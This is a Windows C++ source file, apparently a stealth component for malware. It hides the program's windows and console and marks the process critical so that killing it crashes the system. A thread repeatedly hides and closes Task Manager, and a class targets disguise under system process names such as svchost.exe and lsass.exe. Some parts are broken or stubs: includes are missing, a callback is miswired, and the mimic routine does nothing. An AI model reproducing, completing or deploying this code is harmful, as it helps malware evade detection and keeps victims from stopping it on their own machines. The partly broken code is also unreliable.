// stealth_wrapper.cpp
#include <windows.h>
#include <string>
#include <vector>
#include <thread>

namespace StealthWrapper {

    struct WindowInfo {
        HWND handle;
        std::wstring className;
        std::wstring title;
        DWORD processId;
        bool hidden;
    };

    class WindowHider {
    private:
        std::vector<WindowInfo> m_hiddenWindows;
        std::mutex m_mutex;

        BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
            WindowHider* self = (WindowHider*)lParam;
            WCHAR className[256] = { 0 };
            WCHAR title[256] = { 0 };
            DWORD pid = 0;

            GetClassNameW(hWnd, className, 256);
            GetWindowTextW(hWnd, title, 256);
            GetWindowThreadProcessId(hWnd, &pid);

            if (pid == GetCurrentProcessId()) {
                WindowInfo info = { hWnd, className, title, pid, false };
                self->m_hiddenWindows.push_back(info);
            }
            return TRUE;
        }

    public:
        void HideAllWindows() {
            std::lock_guard<std::mutex> lock(m_mutex);
            EnumWindows(EnumWindowsProcStub, (LPARAM)this);

            for (auto& info : m_hiddenWindows) {
                ShowWindow(info.handle, SW_HIDE);
                info.hidden = true;
            }
        }

        void HideConsoleWindow() {
            HWND hConsole = GetConsoleWindow();
            if (hConsole) {
                ShowWindow(hConsole, SW_HIDE);
                SetWindowLong(hConsole, GWL_EXSTYLE, GetWindowLong(hConsole, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
            }
        }

        static BOOL CALLBACK EnumWindowsProcStub(HWND hWnd, LPARAM lParam) {
            return ((WindowHider*)lParam)->EnumWindowsProc(hWnd, lParam);
        }
    };

    class ProcessProtector {
    private:
        bool m_protected;
        DWORD m_processId;
        HANDLE m_hProcess;

        bool SetCriticalProcess() {
            typedef NTSTATUS (NTAPI *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
            if (hNtdll) {
                pRtlSetProcessIsCritical RtlSetProcessIsCritical =
                    (pRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
                if (RtlSetProcessIsCritical) {
                    BOOLEAN wasCritical = FALSE;
                    RtlSetProcessIsCritical(TRUE, &wasCritical, FALSE);
                    return true;
                }
            }
            return false;
        }

        bool ObRegisterCallbacks() {
            // Placeholder for ObRegisterCallbacks
            return false;
        }

        bool SetHandleProtection() {
            HANDLE hProcess = OpenProcess(PROCESS_SET_INFORMATION, FALSE, m_processId);
            if (!hProcess) return false;

            typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG);
            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
            if (hNtdll) {
                pNtSetInformationProcess NtSetInformationProcess =
                    (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
                if (NtSetInformationProcess) {
                    DWORD protect = 1;
                    NtSetInformationProcess(hProcess, 0x22, &protect, sizeof(protect));
                    CloseHandle(hProcess);
                    return true;
                }
            }
            CloseHandle(hProcess);
            return false;
        }

    public:
        ProcessProtector() : m_protected(false), m_processId(GetCurrentProcessId()) {}

        bool Protect() {
            if (SetCriticalProcess()) return true;
            if (SetHandleProtection()) return true;
            return false;
        }

        bool Unprotect() {
            typedef NTSTATUS (NTAPI *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
            if (hNtdll) {
                pRtlSetProcessIsCritical RtlSetProcessIsCritical =
                    (pRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
                if (RtlSetProcessIsCritical) {
                    BOOLEAN wasCritical = FALSE;
                    RtlSetProcessIsCritical(FALSE, &wasCritical, FALSE);
                    return true;
                }
            }
            return false;
        }
    };

    class TaskManagerBlocker {
    private:
        bool m_blocking;
        std::thread m_workerThread;

        void WorkerFunction() {
            while (m_blocking) {
                HWND hTaskMgr = FindWindowW(L"TaskManagerWindow", NULL);
                if (hTaskMgr) {
                    ShowWindow(hTaskMgr, SW_HIDE);
                    PostMessage(hTaskMgr, WM_CLOSE, 0, 0);
                }
                Sleep(100);
            }
        }

    public:
        TaskManagerBlocker() : m_blocking(false) {}

        void Start() {
            m_blocking = true;
            m_workerThread = std::thread(&TaskManagerBlocker::WorkerFunction, this);
        }

        void Stop() {
            m_blocking = false;
            if (m_workerThread.joinable())
                m_workerThread.join();
        }
    };

    class ProcessMimic {
    private:
        bool MimicProcessName(const std::wstring& targetProcess) {
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot == INVALID_HANDLE_VALUE) return false;

            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnapshot, &pe)) {
                do {
                    std::wstring name(pe.szExeFile);
                    if (_wcsicmp(name.c_str(), targetProcess.c_str()) == 0) {
                        // Found target, mimic this PID
                        CloseHandle(hSnapshot);
                        return true;
                    }
                } while (Process32NextW(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
            return false;
        }

    public:
        bool Mimic(const std::wstring& processName) {
            std::vector<std::wstring> targets = {
                L"svchost.exe",
                L"explorer.exe",
                L"dwm.exe",
                L"csrss.exe",
                L"winlogon.exe",
                L"spoolsv.exe",
                L"lsass.exe"
            };

            for (auto& target : targets) {
                if (MimicProcessName(target)) return true;
            }
            return false;
        }
    };

    WindowHider g_windowHider;
    ProcessProtector g_processProtector;
    TaskManagerBlocker g_taskManagerBlocker;
    ProcessMimic g_processMimic;

    void EnableFullStealth() {
        g_windowHider.HideAllWindows();
        g_windowHider.HideConsoleWindow();
        g_processProtector.Protect();
        g_taskManagerBlocker.Start();
        g_processMimic.Mimic(L"svchost.exe");
    }
}
